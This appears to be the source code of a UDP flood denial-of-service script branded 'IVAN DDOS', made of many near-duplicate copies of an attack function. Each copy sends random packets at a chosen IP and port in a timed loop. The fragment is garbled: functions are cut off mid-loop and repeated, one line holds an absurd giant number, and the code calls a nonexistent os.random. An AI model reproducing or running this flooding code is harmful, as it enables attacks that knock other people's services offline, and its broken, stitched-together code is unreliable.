    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
